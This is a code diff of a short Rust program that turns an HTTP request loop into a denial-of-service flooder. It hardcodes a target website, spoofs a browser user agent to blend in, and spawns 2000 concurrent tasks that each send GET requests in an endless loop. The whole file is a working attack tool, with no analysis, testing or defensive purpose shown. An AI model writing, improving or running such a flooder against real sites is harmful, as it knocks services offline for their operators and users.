@@ -1,26 +1,48 @@
-use core::panic;
+use tokio::task::JoinHandle;
 
-use reqwest::Client;
+use reqwest::{
+    header::{self, HeaderMap},
+    Client,
+};
 
 #[tokio::main]
 async fn main() {
-    let threadspawn = 10000;
-    let target: &str;
-    target = "";
+    let thread_spawn = 2000;
+    let target = "https://sneakyspeedyboii.com/";
 
-    loop {
-        for _j in 0..threadspawn {
-            let http_client = Client::new();
+    let mut headers = HeaderMap::new();
+    headers.insert(
+        header::USER_AGENT,
+        header::HeaderValue::from_str(
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0",
+        )
+        .unwrap(),
+    );
 
-            tokio::spawn(async move {
-                let request = http_client.get(target).body("basic string").send().await;
+    let client_builder = Client::builder().default_headers(headers);
 
-                if let Ok(response) = request {
-                    println!("Response: {}", response.status());
-                } else {
-                    println!("Request failed");
+    let client = client_builder.build().unwrap();
+
+    let mut handles: Vec<JoinHandle<()>> = vec![];
+
+    for _ in 0..thread_spawn {
+        let client = client.clone();
+
+        let handle = tokio::spawn(async move {
+            loop {
+                let res = client.get(target).send().await;
+
+                match res {
+                    Ok(res) => println!("Status: {}", res.status()),
+                    Err(err) => println!("Error: {}", err),
                 }
-            });
-        }
+            }
+        });
+
+        handles.push(handle);
+    }
+
+    for handle in handles {
+        let _ = handle.await;
     }
 }
